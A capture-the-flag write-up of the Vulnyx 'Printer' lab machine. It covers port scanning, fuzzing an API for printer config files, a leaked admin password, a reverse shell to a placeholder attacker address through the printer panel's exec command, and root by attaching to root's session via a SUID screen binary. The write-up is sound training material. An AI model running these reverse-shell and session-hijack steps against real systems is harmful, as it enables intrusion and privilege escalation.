# Vulnyx: Printer

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `wfuzz` · `curl` · `nc` |
| **Tags** | `#IDOR` `#InfoDisclosure` `#RCE` `#SUID` `#SessionHijacking` |
| **URL** | https://vulnyx.com/machines/ |

An API endpoint serving per-printer config files is fuzzed for valid IDs, and one of the recovered files leaks an admin password for a printer's own management service on a custom port. That panel includes an `exec` command, giving straight command execution and a reverse shell. Root comes from a SUID `screen` binary — any user can attach directly into a root-owned session that was left running.

## Enumeration
### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn printer.nyx

PORT     STATE  SERVICE  REASON
22/tcp   open   ssh      syn-ack ttl 64
80/tcp   open   http     syn-ack ttl 64
9999/tcp open   abyss    syn-ack ttl 64
MAC Address: 08:00:27:18:27:BB (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **9999** — not a standard port, worth investigating on its own. A version and script scan on all three fills in the details:

```bash
$ sudo nmap -p 22,80,9999 -sCV printer.nyx

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open   http     Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
9999/tcp open   abyss?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LAN
Desk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, Ter
minalServer, TerminalServerCookie, X11Probe:
|     Konica Minolta Printer Admin Panel
|     Password:
|   NULL:
|_    Konica Minolta Printer Admin Panel
```

Port 9999 introduces itself as a "Konica Minolta Printer Admin Panel" asking for a password — a lead to come back to once that password turns up.

### Web Enumeration

The main page:

```
http://printer.nyx/
```

<img src="../Images/printer/Pasted image 20260726204642.png"/>

A recursive content discovery scan runs against the site:

```bash
$ ffuf -u http://printer.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic --recursion

.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3ms]
index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 6ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 9ms]
api                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 12ms]
[INFO] Adding a new job to the queue: http://printer.nyx/api/FUZZ
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 19ms]
[INFO] Starting queued job on target: http://printer.nyx/api/FUZZ

printers                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 18ms]
[INFO] Adding a new job to the queue: http://printer.nyx/api/printers/FUZZ
[INFO] Starting queued job on target: http://printer.nyx/api/printers/FUZZ

index.html              [Status: 200, Size: 303, Words: 16, Lines: 16, Duration: 2ms]
:: Progress: [882188/882188] :: Job [3/3] :: 4166 req/sec :: Duration: [0:04:13] :: Errors: 0 ::
```

The recursion walks down to an `/api/printers/` endpoint:

```
http://printer.nyx/api/printers/
```

<img src="../Images/printer/Pasted image 20260726204752.png"/>

### API Enumeration

The API looks like it serves per-printer config files by numeric ID, so `wfuzz` targets both the ID and the file extension at once:

```bash
$ wfuzz -c --hc=404 -z range,1-5000 -z list,json-yml -u "http://printer.nyx/api/printers/printerFUZZ.FUZ2Z" 2>/dev/null

Target: http://printer.nyx/api/printers/printerFUZZ.FUZ2Z

=====================================================================
ID           Response   Lines    Word     Chars       Payload
=====================================================================

000000007:   200        6 L      9 W      78 Ch       "4 - json"
000000005:   200        6 L      9 W      79 Ch       "3 - json"
000000009:   200        6 L      9 W      77 Ch       "5 - json"
000000003:   200        6 L      9 W      80 Ch       "2 - json"
000000001:   200        6 L      9 W      82 Ch       "1 - json"
000003197:   200        6 L      9 W      97 Ch       "1599 - json"
```

Six IDs come back valid — `1` through `5` and a stray `1599`. Pulling each config directly:

```bash
$ for i in 1 2 3 4 5 1599; do curl -sX GET "http://printer.nyx/api/printers/printer$i.json"; done
```

One of the config files leaks an admin password:

> **Password:** `$3cUr3Pr1nT3RP4ZZw0rD`

## Initial Access

### RCE via the Printer Admin Panel

Port 9999 turns out to be a management interface for the printer itself, and the leaked password opens it:

```bash
$ nc -v printer.nyx 9999
printer.nyx [<IP_Victim>] 9999 (?) open

Konica Minolta Printer Admin Panel

Password: $3cUr3Pr1nT3RP4ZZw0rD

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```

Among its commands is `exec`, which runs an arbitrary command on the underlying host — enough to fire a reverse shell instead of a one-off command:

```bash
> exec busybox nc <ATTACKER_IP> <PORT> -e /bin/sh
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [printer.nyx] 34502
id
uid=1000(printer) gid=1000(printer) grupos=1000(printer)
```

A quick pty upgrade makes the shell usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Shell as printer

```bash
printer@printer:/var/spool/lpd$ ls -l /home
total 4
drwx------ 3 printer printer 4096 may  4  2023 printer
printer@printer:/var/spool/lpd$ ls -l /home/printer
total 4
-r-------- 1 printer printer 33 may  4  2023 user.txt
printer@printer:/var/spool/lpd$ cat /home/printer/user.txt
7cc698fe83419af87e0a504eb91913e2
```

> **User flag:** `7cc698fe83419af87e0a504eb91913e2`

## Privilege Escalation

### SUID `screen` → Hijacking root's Session

A search for SUID root binaries turns up one that doesn't belong: `screen`.

```bash
printer@printer:/var/spool/lpd$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

```bash
printer@printer:/var/spool/lpd$ ls -l /usr/bin/screen
-rwsr-xr-x 1 root root 482312 feb 27  2021 /usr/bin/screen
```

`screen` carries the SUID bit here. Normally, attaching to someone else's session (`screen -x`) is restricted by the permissions on its socket in `/run/screen` — but with `screen` running as root regardless of who invoked it, that restriction doesn't hold, and any user can attach into any other user's running session. A quick look at the process table shows there's a root session to attach to (kept alive by a loop that respawns it whenever it's empty):

```bash
printer@printer:/var/spool/lpd$ ps aux | grep "screen"
root         413  0.0  0.0   2484   444 ?        Ss   20:25   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
printer     20136  0.0  0.0   6252   700 pts/1    S+   20:42   0:00 grep screen
printer@printer:/var/spool/lpd$ screen -x root/
```

Attaching drops straight into whatever `root`'s own screen session was doing:

```bash
root@printer:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@printer:~# ls -l /root
total 4
-r-------- 1 root root 33 may  4  2023 root.txt
root@printer:~# cat /root/root.txt
616e894462fed90fec26f828a0a6c50e
```

> **Root flag:** `616e894462fed90fec26f828a0a6c50e`

## Takeaways

- An API that serves resources by sequential or predictable ID is worth fuzzing directly — a numeric range combined with a small set of likely extensions can turn up records that were never meant to be enumerable.
- A "management panel" with an `exec` or similarly named command is arbitrary command execution by design, whether it's fronted by HTTP, a raw TCP prompt, or anything else — the interface doesn't need to look like a web shell to function like one.
- A SUID bit on `screen` (or any terminal multiplexer) breaks the isolation between users' sessions entirely — anyone can attach to anyone else's session, root's included, since the multiplexer itself is running with full privileges regardless of who started it.